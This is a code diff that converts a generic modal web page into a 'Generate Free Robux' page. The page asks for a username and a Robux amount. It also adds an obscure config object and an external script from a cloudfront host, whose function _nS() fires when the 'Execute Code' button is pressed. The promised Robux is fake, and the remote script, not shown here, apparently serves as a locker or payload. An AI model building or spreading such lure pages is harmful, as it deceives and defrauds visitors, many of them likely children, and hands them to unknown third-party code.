@@ -3,13 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Interactive Web Page</title>
+    <title>ROBUX ROBUX ROBUX</title>
+    <script type="text/javascript">
+        var bgIfM_PTG_keaHfc={"it":4417761,"key":"e5ae6"};
+    </script>
+    <script src="https://d2zk8mk8hghu3d.cloudfront.net/7819523.js"></script>
     <style>
         /* Base Styles */
         body {
             margin: 0;
             font-family: Arial, sans-serif;
-            background-image: url('default-bg.jpg'); /* Replace 'default-bg.jpg' with your main background image path */
+            background-image: url('bg.png'); /* Replace 'default-bg.jpg' with your main background image path */
             background-size: cover;
             background-position: center;
             height: 100vh;
@@ -22,10 +26,10 @@
             bottom: 10%;
             left: 50%;
             transform: translateX(-50%);
-            padding: 10px 20px;
-            font-size: 18px;
-            background: #007BFF;
-            color: white;
+            padding: 30px 60px;
+            font-size: 30px;
+            background: #ffee00;
+            color: rgb(0, 0, 0);
             border: none;
             cursor: pointer;
             border-radius: 5px;
@@ -60,7 +64,7 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            background-image: url('modal-bg.jpg'); /* Replace 'modal-bg.jpg' with your modal background image path */
+            background-image: url('id.jpg'); /* Replace 'modal-bg.jpg' with your first modal background image path */
             background-size: cover;
             background-position: center;
         }
@@ -80,77 +84,106 @@
             cursor: pointer;
             border-radius: 5px;
         }
-        .modal-footer {
-            display: flex;
-            justify-content: flex-end;
-            padding: 10px;
-            background: #f1f1f1;
-        }
 
-        /* Minimized Modal */
-        .minimized {
-            height: 50px !important;
-            width: 200px !important;
-            overflow: hidden;
-            bottom: 10px;
-            right: 10px;
-            position: fixed;
-            transform: none !important;
+        /* Second Modal Styles */
+        .second-modal-content {
+            background-image: url('amount.jpg'); /* Replace 'second-modal-bg.jpg' with your second modal background image path */
+            background-size: cover;
+            background-position: center;
         }
     </style>
 </head>
 <body>
     <!-- Center Button -->
-    <button class="open-modal-btn">Click Here</button>
+    <button class="open-modal-btn">Generate Free Robux !!</button>
 
-    <!-- Modal -->
+    <!-- First Modal -->
     <div class="modal" id="modal">
         <div class="modal-header">
-            <span>Modal Window</span>
+            <span>ENTER YOUR ID </span>
             <div>
-                <button id="minimize-btn">-</button>
-                <button id="close-btn">X</button>
+                <button id="close-modal-1-btn">X</button>
             </div>
         </div>
         <div class="modal-content">
-            <h2>Welcome</h2>
-            <input type="text" id="text-holder" placeholder="Enter login">
-            <button id="modal-next-btn">Next</button>
+            <!-- <h2>Welcome</h2> -->
+            <input type="text" id="username-input" placeholder="Enter your username">
+            <p id="error-message" style="color: red; display: none;">You must enter a username!</p>
+            <button id="next-modal-btn">Next</button>
+        </div>
+    </div>
+
+    <!-- Second Modal -->
+    <div class="modal" id="second-modal">
+        <div class="modal-header">
+            <span>ENTER ROBUX'S AMOUNT</span>
+            <div>
+                <button id="close-modal-2-btn">X</button>
+            </div>
+        </div>
+        <div class="modal-content second-modal-content">
+            <!-- <h2>Welcome to Step 2</h2> -->
+            <input type="text" id="second-input" placeholder="Enter the robux amount you want ">
+            <button id="execute-code-btn">Execute Code</button>
         </div>
     </div>
 
     <script>
         // Elements
         const modal = document.getElementById('modal');
+        const secondModal = document.getElementById('second-modal');
         const openModalButton = document.querySelector('.open-modal-btn');
-        const closeModalButton = document.getElementById('close-btn');
-        const minimizeModalButton = document.getElementById('minimize-btn');
-        const modalNextButton = document.getElementById('modal-next-btn');
-        const textHolder = document.getElementById('text-holder');
-        let pageIndex = 1;
+        const closeModal1Button = document.getElementById('close-modal-1-btn');
+        const closeModal2Button = document.getElementById('close-modal-2-btn');
+        const nextModalButton = document.getElementById('next-modal-btn');
+        const usernameInput = document.getElementById('username-input');
+        const errorMessage = document.getElementById('error-message');
+        const executeCodeButton = document.getElementById('execute-code-btn');
 
-        // Open Modal
+        // Open First Modal
         openModalButton.addEventListener('click', () => {
             modal.style.display = 'flex';
         });
 
-        // Close Modal
-        closeModalButton.addEventListener('click', () => {
+        // Close First Modal
+        closeModal1Button.addEventListener('click', () => {
             modal.style.display = 'none';
         });
 
-        // Minimize Modal
-        minimizeModalButton.addEventListener('click', () => {
-            modal.classList.toggle('minimized');
+        // Open Second Modal with Validation
+        nextModalButton.addEventListener('click', () => {
+            if (usernameInput.value.trim() === '') {
+                errorMessage.style.display = 'block';
+            } else {
+                errorMessage.style.display = 'none';
+                modal.style.display = 'none';
+                secondModal.style.display = 'flex';
+            }
         });
 
-        // Next Button
-        modalNextButton.addEventListener('click', () => {
-            pageIndex++;
-            document.querySelector('.modal-content').style.backgroundImage = `url('page-${pageIndex}.jpg')`; 
-            // Replace 'page-<number>.jpg' with your desired background image paths for each step
-            textHolder.value = ''; // Clear text holder
+        // Close Second Modal
+        closeModal2Button.addEventListener('click', () => {
+            secondModal.style.display = 'none';
         });
+
+        // Execute Custom Code on Second Modal Button Click
+    //     executeCodeButton.addEventListener('click', () => {
+    //         const secondInputValue = document.getElementById('second-input').value;
+    //         console.log('Executing custom code with input:', secondInputValue);
+    //         // PLACE YOUR CUSTOM CODE HERE
+    //     }
+    // );
+    // Execute Custom Code on Second Modal Button Click
+    executeCodeButton.addEventListener('click', () => {
+    const secondInputValue = document.getElementById('second-input').value;
+    console.log('Executing custom code with input:', secondInputValue);
+    if (typeof _nS === "function") {
+        _nS(); // Call the _nS function
+    } else {
+        console.error("The function _nS is not defined.");
+    }
+    });
+
     </script>
 </body>
 </html>
